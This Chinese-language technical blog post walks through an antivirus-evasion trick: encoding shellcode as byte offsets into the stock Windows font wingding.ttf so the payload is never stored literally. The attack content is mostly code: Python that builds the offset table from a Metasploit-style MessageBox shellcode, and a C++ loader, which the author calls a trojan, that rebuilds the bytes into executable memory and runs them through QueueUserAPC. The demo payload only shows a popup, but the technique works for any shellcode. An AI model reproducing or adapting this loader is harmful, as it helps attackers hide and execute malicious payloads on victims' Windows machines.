# WhiteFile Offset Table Generate Shellcode

## 简介

这篇文章是我还比较菜的时候\(虽然现在也很菜\)，当时看到的时候惊为天人，大概说可以通过计算shellcode需要字符在白文件中的偏移位置，通过记录偏移位置，在不硬编码的情况下还原出shellcode，今天突然想起来，就复现一下。

## 流程

1. 寻找一个全windows都包含且不变的文件\(C:\Windows\Fonts\wingding.ttf\)
2. 遍历文件确认存在全字符\(0x00-0xff\)
3. 计算shellcode在文件内的偏移表
4. 基于便宜表还原shellcode



## 代码

计算偏移表的代码是用py写的，不是专业写算法的，这个计算可能比较low。

```text

dict = open('wingding.ttf','rb+').read();
char =0
for i in range(256):
        for p in range(len(dict)):
                if  ord(chr(dict[p])) == ord(chr(i)):
                        char +=1
                        print(char)
                        break

if char == 256:print("this file has full chars table");
```

![](../.gitbook/assets/image%20%28151%29.png)

通过一段已有的shellcode生成偏移表，我们古典主义脚本小子还是比较喜欢弹个窗。

```text

dict = open('wingding.ttf','rb+').read();

buf =  b""
buf += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
buf += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
buf += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
buf += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
buf += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
buf += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
buf += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
buf += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
buf += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
buf += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
buf += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
buf += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
buf += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
buf += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
buf += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
buf += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
buf += b"\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
buf += b"\x24\x0a\x89\xe3\x68\x58\x20\x20\x20\x68\x4d\x53\x46"
buf += b"\x21\x68\x72\x6f\x6d\x20\x68\x6f\x2c\x20\x66\x68\x48"
buf += b"\x65\x6c\x6c\x31\xc9\x88\x4c\x24\x10\x89\xe1\x31\xd2"
buf += b"\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"

char=0
offsettable=[];
for i in range(len(buf)):
	for p in range(len(dict)):
		if  ord(chr(dict[p])) == ord(chr(buf[i])):
			offsettable.append(p)
			break

#生成偏移表
if char == len(buf):print("shellcode offset tables generate success");
print(offsettable)

#测试还原shellcode
shellcode=[]
for i in offsettable:
	shellcode.append(dict[i])
```

![](../.gitbook/assets/image%20%28154%29.png)

可以还原出来，现在我们在c++把木马写出来。

```text
#include <stdio.h>
#include <Windows.h>



int main()
{	
	DWORD dwReadSize=0;
	HANDLE hFile = CreateFileA("C:\\Windows\\Fonts\\wingding.ttf", GENERIC_READ, OPEN_EXISTING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwSize = GetFileSize(hFile, NULL);
	PCHAR pDict = (PCHAR)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	PCHAR lpBuffer = (PCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	ReadFile(hFile, pDict, dwSize, &dwReadSize, NULL);

	
	DWORD offsets[] = { 2741, 2231, 2569, 2741, 65, 203, 113, 48, 2899, 2707, 825, 48, 2845, 157, 2473, 2317, 11, 2473, 93, 363, 2473, 93, 282, 2473, 2059, 128, 2473, 2395, 95, 2473, 155, 146, 17, 1783, 2341, 64, 2173, 1, 629, 288, 19, 2215, 2473, 141, 203, 203, 2473, 2053, 83, 2473, 29, 549, 159, 1, 2255, 2473, 547, 1783, 2473, 2179, 95, 1, 2231, 721, 745, 14, 2473, 745, 2473, 1, 160, 48, 288, 48, 557, 135, 573, 645, 557, 65, 358, 2797, 387, 1717, 1, 82, 2231, 113, 80, 227, 203, 549, 2341, 19, 2473, 2179, 203, 1, 2231, 108, 2473, 363, 2089, 2473, 2179, 282, 1, 2231, 2473, 9, 2473, 1, 2315, 211, 12, 203, 282, 78, 2809, 2707, 128, 1885, 263, 211, 2399, 211, 2803, 156, 195, 2107, 421, 176, 2131, 2315, 1041, 288, 288, 288, 211, 2053, 9, 2761, 2395, 2771, 407, 126, 597, 282, 203, 2131, 2315, 195, 288, 288, 288, 211, 2053, 128, 156, 141, 141, 95, 1405, 156, 833, 47, 1915, 157, 156, 2341, 126, 173, 301, 11, 1421, 219, 151, 203, 131, 211, 43, 59, 288, 2149, 9, 211, 2803, 355, 2761, 2647, 2611, 62, 75, 597, 282, 203, 2131, 2315, 123, 288, 288, 288, 156, 221, 159, 63, 95, 156, 78, 110, 173, 209, 156, 62, 173, 126, 126, 48, 1421, 219, 151, 203, 131, 211, 721, 156, 63, 95, 95, 95, 156, 62, 13, 2059, 649, 156, 301, 221, 77, 95, 156, 221, 1903, 95, 108, 156, 31, 173, 141, 141, 48, 2845, 219, 28, 203, 23, 211, 19, 48, 2899, 2131, 13, 2125, 2131, 288, 258, 48, 557, 355, 288, 2149, 128 };
	for (int i = 0; i < sizeof(offsets)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = pDict[offsets[i]];
	}
	

	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);
	QueueUserAPC((PAPCFUNC)lpBuffer, hThread, 0);
	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hFile);
	return 0;
}
```

可以看到还原出了shellcode。

![](../.gitbook/assets/image%20%28150%29.png)

![](../.gitbook/assets/image%20%28152%29.png)

脚本小子的任务完成了。

## LINKS

{% embed url="https://www.freebuf.com/articles/system/190740.html" %}



